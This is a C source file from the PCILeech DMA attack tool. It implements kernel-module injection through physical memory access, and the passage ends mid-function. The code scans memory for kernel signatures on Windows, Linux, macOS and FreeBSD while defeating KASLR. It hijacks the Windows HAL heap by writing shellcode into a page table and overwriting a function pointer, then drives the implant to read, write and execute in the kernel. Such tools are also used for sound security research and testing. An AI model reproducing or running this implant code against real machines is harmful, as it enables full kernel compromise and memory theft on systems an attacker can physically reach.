// kmd.c : implementation related to operating systems kernel modules functionality.
//
// (c) Ulf Frisk, 2016
// Author: Ulf Frisk, pcileech@frizk.net
//
#include "kmd.h"
#include "device.h"
#include "util.h"
#include "consoleredir.h"

typedef struct _PHYSICAL_MEMORY_RANGE {
	QWORD BaseAddress;
	QWORD NumberOfBytes;
} PHYSICAL_MEMORY_RANGE, *PPHYSICAL_MEMORY_RANGE;

#define KMDDATA_OPERATING_SYSTEM_WINDOWS		0x01
#define KMDDATA_OPERATING_SYSTEM_LINUX			0x02
#define KMDDATA_OPERATING_SYSTEM_MACOS			0x04
#define KMDDATA_OPERATING_SYSTEM_FREEBSD		0x08

/*
* KMD DATA struct. This struct must be contained in a 4096 byte section (page).
* This page/struct is used to communicate between the inserted kernel code and
* the pcileech program.
* VNR: 002
*/
typedef struct tdKMDDATA {
	QWORD MAGIC;					// [0x000] magic number 0x0ff11337711333377.
	QWORD AddrKernelBase;			// [0x008] pre-filled by stage2, virtual address of kernel header (WINDOWS/MACOS).
	QWORD AddrKallsymsLookupName;	// [0x010] pre-filled by stage2, virtual address of kallsyms_lookup_name (LINUX).
	QWORD DMASizeBuffer;			// [0x018] size of DMA buffer.
	QWORD DMAAddrPhysical;			// [0x020] physical address of DMA buffer.
	QWORD DMAAddrVirtual;			// [0x028] virtual address of DMA buffer.
	QWORD _status;					// [0x030] status of operation
	QWORD _result;					// [0x038] result of operation TRUE|FALSE
	QWORD _address;					// [0x040] virtual address to operate on.
	QWORD _size;					// [0x048] size of operation / data in DMA buffer.
	QWORD OperatingSystem;			// [0x050] operating system type
	QWORD ReservedKMD;				// [0x058] reserved for specific kmd data (dependant on KMD version).
	QWORD ReservedFutureUse1[20];	// [0x060] reserved for future use.
	QWORD dataInExtraLength;		// [0x100] length of extra in-data.
	QWORD dataInExtraOffset;		// [0x108] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataInExtraLengthMax;		// [0x110] maximum length of extra in-data. 
	QWORD dataInConsoleBuffer;		// [0x118] physical address of 1-page console buffer.
	QWORD dataIn[28];				// [0x120]
	QWORD dataOutExtraLength;		// [0x200] length of extra out-data.
	QWORD dataOutExtraOffset;		// [0x208] offset from DMAAddrPhysical/DMAAddrVirtual.
	QWORD dataOutExtraLengthMax;	// [0x210] maximum length of extra out-data. 
	QWORD dataOutConsoleBuffer;		// [0x218] physical address of 1-page console buffer.
QWORD dataOut[28];				// [0x220]
PVOID fn[32];					// [0x300] used by shellcode to store function pointers.
CHAR dataInStr[MAX_PATH];		// [0x400] string in-data
CHAR ReservedFutureUse2[252];
CHAR dataOutStr[MAX_PATH];		// [0x600] string out-data
CHAR ReservedFutureUse3[252];
QWORD ReservedFutureUse4[255];	// [0x800]
QWORD _op;						// [0xFF8] (op is last 8 bytes in 4k-page)
} KMDDATA, *PKMDDATA;

typedef struct tdKMDHANDLE_S12 {
	DWORD dwPageAddr32;
	DWORD dwPageOffset;
	BYTE pbOrig[4096];
	BYTE pbPatch[4096];
	BYTE pbLatest[4096];
	QWORD qwPTE;
	QWORD qwPTEOrig;
	QWORD qwPTEAddrPhys;
} KMDHANDLE_S12, *PKMDHANDLE_S12;

typedef struct tdKMDHANDLE {
	DWORD dwPageAddr32;
	QWORD cPhysicalMap;
	PPHYSICAL_MEMORY_RANGE pPhysicalMap;
	PKMDDATA status;
	BYTE pbPageData[4096];
} KMDHANDLE, *PKMDHANDLE;

typedef struct tdKERNELSEEKER {
	PBYTE pbSeek;
	DWORD cbSeek;
	DWORD aSeek;
	DWORD aTableEntry;
	QWORD vaSeek;
	QWORD vaFn;
} KERNELSEEKER, *PKERNELSEEKER;

#define KMD_CMD_VOID				0xffff
#define KMD_CMD_COMPLETED			0
#define KMD_CMD_READ				1
#define KMD_CMD_WRITE				2
#define KMD_CMD_TERMINATE			3
#define KMD_CMD_MEM_INFO			4
#define KMD_CMD_EXEC				5
#define KMD_CMD_READ_VA				6
#define KMD_CMD_WRITE_VA			7

#define STAGE1_OFFSET_CALL_ADD			1
#define STAGE2_OFFSET_STAGE3_PHYSADDR	4
#define STAGE2_OFFSET_FN_STAGE1_ORIG	8
#define STAGE2_OFFSET_EXTRADATA1		16

BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD);

//-------------------------------------------------------------------------------
// Signature mathing below.
//-------------------------------------------------------------------------------

HRESULT KMD_FindSignature2(_Inout_ PBYTE pbPages, _In_ DWORD cPages, _In_ DWORD dwAddrBase, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatch)
{
	PBYTE pb;
	DWORD pgIdx, i, j;
	PSIGNATURE ps;
	QWORD qwAddressCurrent;
	for(pgIdx = 0; pgIdx < cPages; pgIdx++) {
		pb = pbPages + (4096 * pgIdx);
		qwAddressCurrent = dwAddrBase + (4096 * pgIdx);
		for(i = 0; i < cSignatures; i++) {
			ps = pSignatures + i;
			for(j = 0; j < 2; j++) {
				if(ps->chunk[j].qwAddress) { // already processed and found - continue
					continue;
				}
				if((ps->chunk[j].cbOffset > 0xfff) && ((ps->chunk[j].cbOffset & ~0xfff) != qwAddressCurrent)) {
					continue;
				}
				if(!ps->chunk[j].cb || !memcmp(pb + (ps->chunk[j].cbOffset & 0xfff), ps->chunk[j].pb, ps->chunk[j].cb)) {
					ps->chunk[j].cb = 4096;
					memcpy(ps->chunk[j].pb, pb, 4096);
					ps->chunk[j].qwAddress = qwAddressCurrent;
				}
			}
			if(ps->chunk[0].qwAddress && ps->chunk[1].qwAddress) {
				*pdwSignatureMatch = i;
				return S_OK;
			}
		}
	}
	return E_FAIL;
}

HRESULT KMD_FindSignature1(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PSIGNATURE pSignatures, _In_ DWORD cSignatures, _Out_ PDWORD pdwSignatureMatchIdx)
{
	QWORD i, qwAddrCurrent = 0x100000;
	PBYTE pbBuffer8M;
	HRESULT hr;
	PAGE_STATISTICS pageStat;
	// special case (fixed memory location && zero signature byte length)
	for(i = 0; i < cSignatures; i++) {
		if((pSignatures[i].chunk[0].cbOffset > 0xfff) && (pSignatures[i].chunk[0].cb == 0) && (pSignatures[i].chunk[1].cbOffset > 0xfff) && (pSignatures[i].chunk[1].cb == 0)) {
			pSignatures[i].chunk[0].qwAddress = pSignatures[i].chunk[0].cbOffset & ~0xFFF;
			pSignatures[i].chunk[1].qwAddress = pSignatures[i].chunk[1].cbOffset & ~0xFFF;
			return TRUE;
		}
	}
	// initialize / allocate memory / load signatures
	if(!(pbBuffer8M = LocalAlloc(0, 0x800000))) {
		return E_OUTOFMEMORY;
	}
	memset(&pageStat, 0, sizeof(PAGE_STATISTICS));
	pageStat.cPageTotal = 0x00100000;
	pageStat.cPageFail = 256;
	pageStat.szCurrentAction = "Searching for KMD location";
	pageStat.qwTickCountStart = GetTickCount64();
	// loop kmd-find
	while(qwAddrCurrent < pCfg->qwAddrMax && qwAddrCurrent < 0xffffffff) {
		ShowUpdatePageRead(pCfg, qwAddrCurrent, &pageStat);
		if(DeviceReadDMA(pDeviceData, (DWORD)qwAddrCurrent, pbBuffer8M, 0x800000, 0)) {
			pageStat.cPageSuccess += 2048;
			hr = KMD_FindSignature2(pbBuffer8M, 2048, (DWORD)qwAddrCurrent, pSignatures, cSignatures, pdwSignatureMatchIdx);
			if(SUCCEEDED(hr)) {
				LocalFree(pbBuffer8M);
				pageStat.szCurrentAction = "Waiting for KMD to activate";
				ShowUpdatePageRead(pCfg, qwAddrCurrent, &pageStat);
				return S_OK;
			}
		} else {
			pageStat.cPageFail += 2048;
		}
		qwAddrCurrent += 0x800000;
	}
	LocalFree(pbBuffer8M);
	return E_FAIL;
}

//-------------------------------------------------------------------------------
// macOS generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_MacOSIsKernelAddress(_In_ PBYTE pbPage)
{
	DWORD i;
	if(*(PDWORD)pbPage != 0xfeedfacf) { return FALSE; } // mach_header_64 magic
	if(*(PDWORD)(pbPage + 4) != 0x01000007) { return FALSE; } // mach_header_64 cputype
	// search for kernel header data (eliminate other macho-headers)
	for(i = 0x20; i < 0xfc0; i += 8) {
		if(*(PQWORD)(pbPage + i) == 0x5450746f6F625F5F) { // __bootPT
			return TRUE;
		}
	}
	return FALSE;
}

BOOL KMD_MacOSKernelGetBase(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PDWORD pdwKernelBase, _Out_ PDWORD pdwTextHIB, _Out_ PDWORD pcbTextHIB)
{
	BYTE pbPage[4096];
	DWORD i, cKSlide;
	for(cKSlide = 1; cKSlide <= 512; cKSlide++) {
		*pdwKernelBase = cKSlide * 0x00200000; // KASLR = ([RND:1..512] * 0x00200000)
		if(!DeviceReadDMA(pDeviceData, *pdwKernelBase, pbPage, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. Error reading address: 0x%08x\n", *pdwKernelBase);
			return FALSE;
		}
		if(KMD_MacOSIsKernelAddress(pbPage)) {
			for(i = 0x20; i < 0xfc0; i += 8) {
				if(*(PQWORD)(pbPage + i) == 0x0000747865745F5F && *(PQWORD)(pbPage + i + 0x10) == 0x0000004249485F5F) { // __text && __HIB
					*pdwTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x20);
					*pcbTextHIB = (DWORD)*(PQWORD)(pbPage + i + 0x28);
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

BOOL KMD_MacOSKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	const BYTE SIGNATURE_BCOPY[] = { 0x48, 0x87, 0xF7, 0x48, 0x89, 0xD1, 0x48, 0x89, 0xF8, 0x48, 0x29, 0xF0, 0x48, 0x39, 0xC8, 0x72 };
	DWORD i, dwKernelBase, dwTextHIB, cbTextHIB;
	PBYTE pbTextHIB;
	if(!KMD_MacOSKernelGetBase(pCfg, pDeviceData, &dwKernelBase, &dwTextHIB, &cbTextHIB)) {
		return FALSE;
	}
	cbTextHIB = (cbTextHIB + 0xfff) & 0xfffff000;
	pbTextHIB = LocalAlloc(0, cbTextHIB);
	if(!pbTextHIB) { return FALSE; }
	if(!DeviceReadDMA(pDeviceData, dwTextHIB, pbTextHIB, cbTextHIB, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
		LocalFree(pbTextHIB);
		return FALSE;
	}
	for(i = 0; i < cbTextHIB - 0x300; i++) {
		if(0 == memcmp(pbTextHIB + i, SIGNATURE_BCOPY, 16)) {
			Util_CreateSignatureMacOSGeneric(dwKernelBase, dwTextHIB + i, dwTextHIB + cbTextHIB - 0x300, pSignature);
			LocalFree(pbTextHIB);
			return TRUE;
		}
	}
	LocalFree(pbTextHIB);
	return FALSE;
}

//-------------------------------------------------------------------------------
// FreeBSD generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_FreeBSDKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	DWORD i, dwo_memcpy_str, dwo_strtab, dwa_memcpy;
	PBYTE pb64M = LocalAlloc(LMEM_ZEROINIT, 0x04000000);
	if(!pb64M) { return FALSE; }
	for(i = 0x01000000; i < 0x04000000; i += 0x01000000) {
		DeviceReadDMA(pDeviceData, i, pb64M + i, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	}
	// 1: search for string 'vn_open'
	i = 0;
	while(TRUE) {
		i++;
		if(i > 0x04000000 - 0x1000) { goto error; }
		if(0 == memcmp(pb64M + i, "\0vn_open", 9)) { break; }
	}
	dwo_memcpy_str = i + 1;
	i = i & ~3;
	// 2: scan backwards for base of strtab
	while(TRUE) {
		i -= 4;
		if(i < 0x1000) { goto error; }
		if(0 == *(PDWORD)(pb64M + i - 4)) { 
			DWORD dwbug = *(PDWORD)(pb64M + i - 4);
			break; 
		}
	}
	dwo_strtab = i;
	i = i - 8; // skip necessary
	// 3: scan backwards for 'vn_open' function address
	while(TRUE) {
		i -= 0x18;
		if(i < 0x1000) { goto error; }
		if(0 == *(PQWORD)(pb64M + i)) { goto error; }
		if(dwo_memcpy_str - dwo_strtab == *(PDWORD)(pb64M + i)) { break; }
	}
	dwa_memcpy = *(PDWORD)(pb64M + i + 8) & 0x7fffffff;
	// 4: create signature
	LocalFree(pb64M);
	Util_CreateSignatureFreeBSDGeneric(dwo_strtab, dwa_memcpy, pSignature);
	return TRUE;
error:
	LocalFree(pb64M);
	return FALSE;
}

//-------------------------------------------------------------------------------
// LINUX generic kernel seek below.
//-------------------------------------------------------------------------------

BOOL KMD_LinuxIsAllAddrFoundSeek(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	for(DWORD j = 0; j < cS; j++) {
		if(!pS[j].aSeek) {
			return FALSE;
		}
	}
	return TRUE;
}

BOOL KMD_LinuxIsAllAddrFoundTableEntry(_In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	for(DWORD j = 0; j < cS; j++) {
		if(!pS[j].aTableEntry) {
			return FALSE;
		}
	}
	return TRUE;
}

BOOL KMD_LinuxFindFunctionAddr(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	DWORD o, i;
	for(o = 0; o < cb - 0x1000; o++) {
		for(i = 0; i < cS; i++) {
			if(!pS[i].aSeek && !memcmp(pb + o, pS[i].pbSeek, pS[i].cbSeek)) {
				pS[i].aSeek = o + 1;
				if(KMD_LinuxIsAllAddrFoundSeek(pS, cS)) {
					return TRUE;
				}
			}
		}
	}
	return FALSE;
}

BOOL KMD_LinuxFindFunctionAddrTBL(_In_ PBYTE pb, _In_ DWORD cb, _In_ PKERNELSEEKER pS, _In_ DWORD cS)
{
	DWORD o, i;
	for(o = 0x1000; o < cb - 0x1000; o = o + 8) {
		if(((*(PQWORD)(pb + o) & 0xffffffff00000000) == 0xffffffff00000000) && ((*(PQWORD)(pb + o - 8) & 0xffffffff00000000) == 0xffffffff00000000)) { // kernel addr ptr
			for(i = 0; i < cS; i++) {
				if(!pS[i].aTableEntry &&
					((*(PQWORD)(pb + o) & 0x1fffff) == (0x1fffff & pS[i].aSeek)) && // KASLR align on 2MB boundries (0x1fffff)
					((*(PQWORD)(pb + o) & ~0x1fffff) != (*(PQWORD)(pb + o - 8)  & ~0x1fffff))) // several tables may exists - skip symbol name table
				{
					pS[i].aTableEntry = o;
					pS[i].vaSeek = *(PQWORD)(pb + o);
					pS[i].vaFn = *(PQWORD)(pb + o - 8);
					if(KMD_LinuxIsAllAddrFoundTableEntry(pS, cS)) {
						return TRUE;
					}
				}
			}
		}
	}
	return FALSE;
}

#define CONFIG_LINUX_SEEK_BUFFER_SIZE	0x01000000
#define CONFIG_LINUX_SEEK_CKSLIDES		512
BOOL KMD_LinuxKernelSeekSignature(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Out_ PSIGNATURE pSignature)
{
	BOOL result;
	KERNELSEEKER ks[2] = {
		{ .pbSeek = "\0kallsyms_lookup_name",.cbSeek = 22 },
		{ .pbSeek = "\0vfs_read",.cbSeek = 10 }
	};
	DWORD cKSlide, dwKernelBase;
	PBYTE pb = LocalAlloc(0, CONFIG_LINUX_SEEK_BUFFER_SIZE);
	if(!pb) { return FALSE; }
	for(cKSlide = 0; cKSlide < CONFIG_LINUX_SEEK_CKSLIDES; cKSlide++) {
		// calculate the kernel base (@16M if no KASLR, @2M offsets if KASLR).
		// read 16M of memory first, if KASLR read 2M chunks at top of analysis buffer (performance reasons).
		dwKernelBase = 0x01000000 + cKSlide * 0x00200000; // KASLR = 16M + ([RND:0..511] * 2M) ???
		if(cKSlide == 0) {
			DeviceReadDMA(pDeviceData, dwKernelBase, pb, 0x01000000, PCILEECH_MEM_FLAG_RETRYONFAIL);
		} else {
			memmove(pb, pb + 0x00200000, CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000);
			result = DeviceReadDMA(
				pDeviceData,
				dwKernelBase + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
				pb + CONFIG_LINUX_SEEK_BUFFER_SIZE - 0x00200000,
				0x00200000,
				PCILEECH_MEM_FLAG_RETRYONFAIL);
		}
		result = 
			KMD_LinuxFindFunctionAddr(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2) &&
			KMD_LinuxFindFunctionAddrTBL(pb, CONFIG_LINUX_SEEK_BUFFER_SIZE, ks, 2);
		if(result) {
			Util_CreateSignatureLinuxGeneric(dwKernelBase, ks[0].aSeek, ks[0].vaSeek, ks[0].vaFn, ks[1].vaFn, pSignature);
			break;
		}
	}
	LocalFree(pb);
	return result;
}

//-------------------------------------------------------------------------------
// Windows 8/10 generic kernel implant below.
//-------------------------------------------------------------------------------

BOOL KMD_Win_SearchTableHalpInterruptController(_In_ PBYTE pbPage, _In_ QWORD qwPageVA, _Out_ PDWORD dwHookFnPgOffset)
{
	DWORD i;
	BOOL result;
	for(i = 0; i < (0x1000 - 0x78); i += 8) {
		result =
			(*(PQWORD)(pbPage + i + 0x18) == 0x28) &&
			((*(PQWORD)(pbPage + i + 0x00) & ~0xfff) == qwPageVA) &&
			((*(PQWORD)(pbPage + i + 0x10) & ~0xfff) == qwPageVA) &&
			((*(PQWORD)(pbPage + i + 0x78) & 0xffffff0000000000) == 0xfffff80000000000);
		if(result) {
			*dwHookFnPgOffset = i + 0x78;
			return TRUE;
		}
	}
	return FALSE;
}

// https://blog.coresecurity.com/2016/08/25/getting-physical-extreme-abuse-of-intel-based-paging-systems-part-3-windows-hals-heap/
BOOL KMDOpen_HalHeapHijack(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	DWORD ADDR_HAL_HEAP_PA = 0x00001000;
	QWORD ADDR_SHELLCODE_VA = 0xffffffffffc00100;
	BOOL result;
	SIGNATURE oSignature;
	PKMDHANDLE pKMD = NULL;
	PDWORD pdwPhysicalAddress;
	BYTE pbHal[0x1000] = { 0 }, pbPT[0x1000] = { 0 }, pbNULL[0x300] = { 0 };
	DWORD dwHookFnPgOffset;
	QWORD qwPML4, qwAddrHalHeapVA, qwPTEOrig, qwPTEPA, qwPTPA;
	//------------------------------------------------
	// 1: Fetch hal.dll heap and perform sanity checks.
	//------------------------------------------------
	Util_CreateSignatureWindowsHalGeneric(&oSignature);
	result = DeviceReadDMA(pDeviceData, ADDR_HAL_HEAP_PA, pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	qwPML4 = *(PQWORD)(pbHal + 0xa0);
	qwAddrHalHeapVA = *(PQWORD)(pbHal + 0x78);
	if(!result || (qwPML4 & 0xffffffff00000fff) || ((qwAddrHalHeapVA & 0xfffffffffff00fff) != 0xffffffffffd00000)) {
		printf("KMD: Failed. Error reading or interpreting hal heap #1.\n");
		goto fail;
	}
	result = Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA);
	if(!result || ((qwPTEOrig & 0x00007ffffffff003) != 0x1003)) {
		printf("KMD: Failed. Error reading or interpreting hal PTE.\n");
		goto fail;
	}
	//------------------------------------------------
	// 2: Search for function table in hal.dll heap.
	//------------------------------------------------
	for(qwAddrHalHeapVA = 0xffffffffffd00000; qwAddrHalHeapVA < 0xffffffffffe00000; qwAddrHalHeapVA += 0x1000) {
		result =
			Util_PageTable_ReadPTE(pCfg, pDeviceData, qwPML4, qwAddrHalHeapVA, &qwPTEOrig, &qwPTEPA) &&
			((qwPTEOrig & 0x00007fff00000003) == 0x00000003) &&
			DeviceReadDMA(pDeviceData, (qwPTEOrig & 0xfffff000), pbHal, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL) &&
			KMD_Win_SearchTableHalpInterruptController(pbHal, qwAddrHalHeapVA, &dwHookFnPgOffset);
		if(result) {
			break;
		}
	}
	if(!result) {
		printf("KMD: Failed. Failed finding entry point.\n");
		goto fail;
	}
	qwPTPA = qwPTEPA & ~0xfff;
	result = DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 0x1000, PCILEECH_MEM_FLAG_RETRYONFAIL);
	if(!result || memcmp(pbPT, pbNULL, 0x300)) { // first 0x300 bytes in Hal PT must be zero
		printf("KMD: Failed. Error reading or interpreting PT.\n");
		goto fail;
	}
	//------------------------------------------------
	// 3: Write shellcode into page table empty space.
	//------------------------------------------------
	*(PQWORD)pbPT = qwPTPA | 0x63; // PTE for addr: 0xffffffffffc00000 
	memcpy(pbPT + 0x100, oSignature.chunk[3].pb, oSignature.chunk[3].cb);
	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_FN_STAGE1_ORIG) = *(PQWORD)(pbHal + dwHookFnPgOffset);
	*(PQWORD)(pbPT + 0x100 + STAGE2_OFFSET_EXTRADATA1) = qwAddrHalHeapVA + dwHookFnPgOffset;
	printf("INFO: PA PT:     0x%08x\n", qwPTPA);
	printf("INFO: PA FN:     0x%08x\n", (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset);
	DeviceWriteDMA(pDeviceData, qwPTPA, pbPT, 0x300, PCILEECH_MEM_FLAG_RETRYONFAIL);
	//------------------------------------------------
	// 4: Place hook by overwriting function addr in hal.dll heap.
	//------------------------------------------------
	Sleep(250);
	DeviceWriteDMA(pDeviceData, (qwPTEOrig & 0xfffff000) + dwHookFnPgOffset, (PBYTE)&ADDR_SHELLCODE_VA, sizeof(QWORD), PCILEECH_MEM_FLAG_RETRYONFAIL);
	printf("KMD: Code inserted into the kernel - Waiting to receive execution.\n");
	//------------------------------------------------
	// 5: wait for patch to reveive execution.
	//------------------------------------------------
	pdwPhysicalAddress = (PDWORD)(pbPT + 0x100 + STAGE2_OFFSET_STAGE3_PHYSADDR);
	do {
		Sleep(100);
		if(!DeviceReadDMA(pDeviceData, (DWORD)qwPTPA, pbPT, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			printf("KMD: Failed. DMA Read failed while waiting to receive physical address.\n");
			goto fail;
		}
	} while(!*pdwPhysicalAddress);
	printf("KMD: Execution received - continuing ...\n");
	//------------------------------------------------
	// 6: Restore hooks to original.
	//------------------------------------------------
	Sleep(250);
	DeviceWriteDMA(pDeviceData, qwPTPA, pbNULL, 0x300, 0);
	//------------------------------------------------
	// 7: Set up kernel module shellcode (stage3)
	//------------------------------------------------
	if(*pdwPhysicalAddress == 0xffffffff) {
		printf("KMD: Failed. Stage2 shellcode error.\n");
		goto fail;
	}
	DeviceWriteDMA(pDeviceData, *pdwPhysicalAddress + 0x1000, oSignature.chunk[4].pb, 4096, 0);
	if(!(pKMD = LocalAlloc(LMEM_ZEROINIT, sizeof(KMDHANDLE)))) { goto fail; }
	pKMD->dwPageAddr32 = *pdwPhysicalAddress;
	pKMD->status = (PKMDDATA)pKMD->pbPageData;
	DeviceReadDMA(pDeviceData, pKMD->dwPageAddr32, pKMD->pbPageData, 4096, 0);
	//------------------------------------------------
	// 8: Retrieve physical memory range map and complete open action.
	//------------------------------------------------
	if(!KMD_GetPhysicalMemoryMap(pCfg, pDeviceData, pKMD)) {
		printf("KMD: Failed. Failed to retrieve physical memory map.\n");
		goto fail;
	}
	pDeviceData->KMDHandle = (HANDLE)pKMD;
	if(pCfg->tpAction == KMDLOAD) { pCfg->qwKMD = pKMD->dwPageAddr32; }
	return TRUE;
fail:
	LocalFree(pKMD);
	return FALSE;
}

//-------------------------------------------------------------------------------
// KMD command function below.
//-------------------------------------------------------------------------------

BOOL KMD_IsRangeInPhysicalMap(_In_ PKMDHANDLE phKMD, _In_ QWORD qwBaseAddress, _In_ QWORD qwNumberOfBytes)
{
	PHYSICAL_MEMORY_RANGE pmr;
	for(QWORD i = 0; i < phKMD->cPhysicalMap; i++) {
		pmr = phKMD->pPhysicalMap[i];
		if(((pmr.BaseAddress <= qwBaseAddress) && (pmr.BaseAddress + pmr.NumberOfBytes > qwBaseAddress + qwNumberOfBytes))) {
			return TRUE;
		}
	}
	return FALSE;
}

BOOL KMD_SubmitCommand(_In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD, _In_ QWORD op)
{
	phKMD->status->_op = op;
	if(!DeviceWriteDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, 0)) {
		return FALSE;
	}
	do {
		if(!DeviceReadDMA(pDeviceData, phKMD->dwPageAddr32, phKMD->pbPageData, 4096, PCILEECH_MEM_FLAG_RETRYONFAIL)) {
			return FALSE;
		}
	} while(((phKMD->status->_op != KMD_CMD_COMPLETED) || (phKMD->status->_status != 1)) && phKMD->status->_status < 0x0fffffff);
	return TRUE;
}

BOOL KMD_GetPhysicalMemoryMap(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData, _Inout_ PKMDHANDLE phKMD)
{
	QWORD qwMaxMemoryAddress;
	KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_MEM_INFO);
	if(!phKMD->status->_result || !phKMD->status->_size)	{
		return FALSE;
	}
	phKMD->pPhysicalMap = LocalAlloc(LMEM_ZEROINIT, (phKMD->status->_size + 0x1000) & 0xfffff000);
	if(!phKMD->pPhysicalMap) { return FALSE; }
	DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, (PBYTE)phKMD->pPhysicalMap, (DWORD)((phKMD->status->_size + 0x1000) & 0xfffff000), 0);
	phKMD->cPhysicalMap = phKMD->status->_size / sizeof(PHYSICAL_MEMORY_RANGE);
	// adjust max memory according to physical memory
	qwMaxMemoryAddress = phKMD->pPhysicalMap[phKMD->cPhysicalMap - 1].BaseAddress;
	qwMaxMemoryAddress += phKMD->pPhysicalMap[phKMD->cPhysicalMap - 1].NumberOfBytes;
	if(pCfg->qwAddrMax > qwMaxMemoryAddress) {
		pCfg->qwAddrMax = qwMaxMemoryAddress - 1;
	}
	return TRUE;
}

BOOL KMDReadMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	BOOL result;
	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) {
		if(cb <= 0x1000) { // Return blank memory and ok on 1 page read (smallest unit) if not in physical map.
			memset(pb, 0, cb);
			return TRUE;
		}
		return FALSE;
	}
	phKMD->status->_size = cb;
	phKMD->status->_address = qwAddress;
	result = KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_VOID);
	if(!result) { return FALSE; }
	result = KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_READ);
	if(!result) { return FALSE; }
	return DeviceReadDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0);
}

BOOL KMDWriteMemory_DMABufferSized(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _In_ PBYTE pb, _In_ DWORD cb)
{
	BOOL result;
	PKMDHANDLE phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
	if(!KMD_IsRangeInPhysicalMap(phKMD, qwAddress, cb) && !pDeviceData->IsAllowedAccessReservedAddress) { return E_FAIL; }
	result = DeviceWriteDMA(pDeviceData, phKMD->status->DMAAddrPhysical, pb, cb, 0);
	if(!result) { return FALSE; }
	phKMD->status->_size = cb;
	phKMD->status->_address = qwAddress;
	result = KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_VOID);
	if(!result) { return FALSE; }
	return KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_WRITE);
}

BOOL KMDReadMemory(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	DWORD dwDMABufferSize = (DWORD)((PKMDHANDLE)pDeviceData->KMDHandle)->status->DMASizeBuffer;
	DWORD o = cb;
	dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
	while(TRUE) {
		if(o <= dwDMABufferSize) {
			return KMDReadMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, o);
		} else if(!KMDReadMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
			return FALSE;
		}
		o -= dwDMABufferSize;
	}
}

BOOL KMDWriteMemory(_In_ PDEVICE_DATA pDeviceData, _In_ QWORD qwAddress, _Out_ PBYTE pb, _In_ DWORD cb)
{
	DWORD dwDMABufferSize = (DWORD)((PKMDHANDLE)pDeviceData->KMDHandle)->status->DMASizeBuffer;
	DWORD o = cb;
	dwDMABufferSize = dwDMABufferSize ? dwDMABufferSize : 0x01000000;
	while(TRUE) {
		if(o <= dwDMABufferSize) {
			return KMDWriteMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, o);
		} else if(!KMDWriteMemory_DMABufferSized(pDeviceData, qwAddress + cb - o, pb + cb - o, dwDMABufferSize)) {
			return FALSE;
		}
		o -= dwDMABufferSize;
	}
}

VOID KMDClose(_In_ PDEVICE_DATA pDeviceData)
{
	PKMDHANDLE phKMD;
	if(pDeviceData->KMDHandle) {
		phKMD = (PKMDHANDLE)pDeviceData->KMDHandle;
		KMD_SubmitCommand(pDeviceData, phKMD, KMD_CMD_TERMINATE);
		LocalFree(pDeviceData->KMDHandle);
		pDeviceData->KMDHandle = NULL;
	}
}

BOOL KMDOpen_MemoryScan(_In_ PCONFIG pCfg, _In_ PDEVICE_DATA pDeviceData)
{
	SIGNATURE oSignatures[CONFIG_MAX_SIGNATURES];
	PSIGNATURE pSignature;
